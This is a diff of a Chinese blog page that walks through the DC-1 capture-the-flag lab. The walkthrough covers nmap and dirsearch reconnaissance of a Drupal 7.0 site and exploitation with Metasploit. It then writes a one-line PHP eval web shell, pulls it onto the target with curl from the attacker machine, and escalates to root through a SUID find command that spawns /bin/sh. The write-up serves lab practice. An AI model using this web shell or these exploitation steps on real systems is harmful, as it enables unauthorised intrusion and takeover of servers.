@@ -305,16 +305,22 @@
 
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704091615731-24f43c74-c974-45e3-802e-a510ce7e8cf2.png"></p>
 <h2 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h2><p>1.通过此命令查看DC1的基本信息：nmap -sS 192.168.17.133 -A</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092567178-54de0a76-63b1-44cb-881b-570720c25d74.png">2.通过此命令查看DC1的全端口信息：nmap -p- 192.168.17.133</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092890218-39a06a68-9eb7-4744-bedb-80a6a5a7afbb.png">3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094358883-fbdc679d-d33d-41d9-ae85-dd9ae4e5701d.png">再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094392970-8a2f5cd7-0d79-46f5-9240-fd5b523c67ba.png">4.进行目录扫描：dirsearch -u 192.168.17.133 -x 403，404 -t 50 </p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096389841-ac8a1e9b-072f-46cc-992a-ddafb4cd2c22.png">在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092567178-54de0a76-63b1-44cb-881b-570720c25d74.png"></p>
+<p>2.通过此命令查看DC1的全端口信息：nmap -p- 192.168.17.133</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704092890218-39a06a68-9eb7-4744-bedb-80a6a5a7afbb.png"></p>
+<p>3.确定版本：nmap -p 80 -sV 192.168.17.133,由于自己试过无法主机无法到达，因为两个虚拟机都选择的是nat模式所以无法互相拼通。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094358883-fbdc679d-d33d-41d9-ae85-dd9ae4e5701d.png"></p>
+<p>再在kali机上面打开浏览器搜索192.168.17.133:80,关键字是:Drupal Site ,用sql注入进行尝试发现没啥用处，邮箱注册发送也没用</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704094392970-8a2f5cd7-0d79-46f5-9240-fd5b523c67ba.png"></p>
+<p>4.进行目录扫描：dirsearch -u 192.168.17.133 -x 403，404 -t 50 </p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096389841-ac8a1e9b-072f-46cc-992a-ddafb4cd2c22.png"></p>
+<p>在网页后面加上&#x2F;robots.txt。这个文件是一个爬虫文件。robots.txt 是一个用于指导网络爬虫的文件。它是位于网站根目录下的一个文本文件，用于向搜索引擎和其他网络爬虫提供关于网站爬取规则的指示。当搜索引擎的爬虫访问一个网站时，它会首先查找并读取 robots.txt 文件。该文件中包含了一些指令，告诉爬虫哪些网页可以被爬取，哪些不可以。通过 robots.txt，网站管理员可以控制搜索引擎爬虫在访问网站时的行为，例如禁止爬虫访问某些特定的页面、目录或文件。</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704096070188-0a24b7ba-1294-4cdf-b5c1-9d865689d136.png">再去看一下&#x2F;UPGRADE.txt可以发现Drupal是一个框架，当前版本是7.0，百度搜索一下，发现版本比较老，可能存在漏洞。</p>
 <h2 id="msf尝试进行攻击："><a href="#msf尝试进行攻击：" class="headerlink" title="msf尝试进行攻击："></a>msf尝试进行攻击：</h2><p>启动msf:msfconsole</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097120601-d2cc9855-7416-4f9e-8f1e-efaeaf41708f.png"></p>
 <p>搜索框架漏洞：search drupal</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097235060-b53250b7-22e8-41ab-92f8-888304e867d6.png">发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。尝试用use 0会话没有创建成功，用use 2成功创建会话。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097235060-b53250b7-22e8-41ab-92f8-888304e867d6.png"></p>
+<p>发现存在这些漏洞，一个个进行尝试，最后发现第二个能够成功。尝试用use 0会话没有创建成功，用use 2成功创建会话。</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097625687-a4dd0a8f-65f5-45b7-a4bf-608ef5e3cbd8.png"></p>
 <p>show options查看必须要设置的选项</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704097681635-0fe434fc-e915-475e-85a7-402942ec824b.png"><br>set rhosts <strong>192.168.17.133#这个ip是DC1的ip</strong></p>
@@ -329,23 +335,30 @@
 <h2 id="上传文件："><a href="#上传文件：" class="headerlink" title="上传文件："></a>上传文件：</h2><p>where curl #curl类似于一个命令行工具或者库</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099285441-aefcacab-3400-4c6d-a02f-f91321f66138.png"></p>
 <p>输入curl出现帮助手册说明存在。</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099382857-a087ef21-36cc-451a-bd90-c19d11e38908.png">curl <a target="_blank" rel="noopener" href="https://www.baidu.com/">www.baidu.com</a></p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099478702-f1bc2532-f915-498b-befc-0852c39a96b2.png">在桌面新建一个1.php</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099382857-a087ef21-36cc-451a-bd90-c19d11e38908.png"></p>
+<p>curl <a target="_blank" rel="noopener" href="https://www.baidu.com/">www.baidu.com</a></p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099478702-f1bc2532-f915-498b-befc-0852c39a96b2.png"></p>
+<p>在桌面新建一个1.php</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">@eval($_GET[cmd]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704099768665-38421335-8090-4172-a06f-99ad968ad8c0.png"></p>
 <p>重新开一个cmd窗口输入python -m http.server 80#意思是说将当前目录设置为网站根目录。</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100698868-cb6e5f0f-9c78-49a2-8afd-13bb4adabce0.png"><a target="_blank" rel="noopener" href="http://192.168.17.132/">http://192.168.17.132</a> -o 1.php</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100876363-b625babc-13a8-4ad1-ac86-19c5ebf2d5ca.png">ls发现上传成功。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100876363-b625babc-13a8-4ad1-ac86-19c5ebf2d5ca.png"></p>
+<p>ls发现上传成功。</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704100921325-dbbf9a27-02c4-4540-8588-7a274308e7a7.png"><br>cat 1.php出现其他的内容说明上传的方式错了，上传了个下载连接地址。正确的方式是这样的：curl <a target="_blank" rel="noopener" href="http://192.168.17.132/1.php">http://192.168.17.132/1.php</a> -o 2.php</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101099861-4ba79589-8d60-4084-8a0f-f93a33300d1d.png">cat 2.php</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101099861-4ba79589-8d60-4084-8a0f-f93a33300d1d.png"></p>
+<p>cat 2.php</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101442272-d3c78ef4-de18-4d1c-80cb-57f900b9e568.png"></p>
 <p>成功之后调用系统命令执行函数。192.168.17.133&#x2F;2.php?cmd&#x3D;sytem(ls);</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101508378-94efa053-014e-43bf-8545-f649153039e3.png">通过木马获取权限，这是一种办法。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704101508378-94efa053-014e-43bf-8545-f649153039e3.png"></p>
+<p>通过木马获取权限，这是一种办法。</p>
 <h2 id="短暂获取权限："><a href="#短暂获取权限：" class="headerlink" title="短暂获取权限："></a>短暂获取权限：</h2><p>python加强一下shell权限：python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”#使用交互shell<br>python -c “import pty;pty.spawn(‘&#x2F;bin&#x2F;bash’)”<br><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102099589-99c9586a-cf89-4c12-a6e5-be70a7281f24.png">                               </p>
 <p>find提权：find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null#这里利用SUID进行提权，查看SUID的二进制可执行文件。<br>find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>解释：find 是一个命令，用于在文件系统中搜索文件或目录。&#x2F; 是搜索的起始点，表示从根目录开始搜索。-user root 是一个选项，表示搜索属主为 root 的文件或目录。-perm -4000 是另一个选项，表示搜索权限设置为 4000（八进制表示）的文件或目录。其中的 - 表示匹配减去指定权限后的结果，4000 则对应 SUID 权限位。-print 是一个选项，表示找到匹配的文件或目录时打印出它们的路径。最后的 2&gt;&#x2F;dev&#x2F;null 是将搜索过程中产生的错误信息（标准错误输出）重定向到 &#x2F;dev&#x2F;null 设备中，以避免显示错误信息。</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102314135-8d6ce1e0-5b70-46f2-b26d-c1fe9ef1fffd.png">find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限id查看当前的用户。</p>
-<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704103236731-3f110ef3-b580-42e4-851d-330f2d65b1d1.png">cd &#x2F;root切换到root根目录ls 发现最终的flagcat theflnalfalg.txt 查看文件内容</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704102314135-8d6ce1e0-5b70-46f2-b26d-c1fe9ef1fffd.png"></p>
+<p>find &#x2F; -name cron.php -exec “&#x2F;bin&#x2F;sh” ; #利用find获取root权限id查看当前的用户。</p>
+<p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704103236731-3f110ef3-b580-42e4-851d-330f2d65b1d1.png"></p>
+<p>cd &#x2F;root切换到root根目录ls 发现最终的flagcat theflnalfalg.txt 查看文件内容</p>
 <p><img src="https://raw.githubusercontent.com/Xiaotang23/tu/main/img/1704103344531-6a88df95-4dbd-4155-9fe9-c635e20d6078.png"></p>
 
       
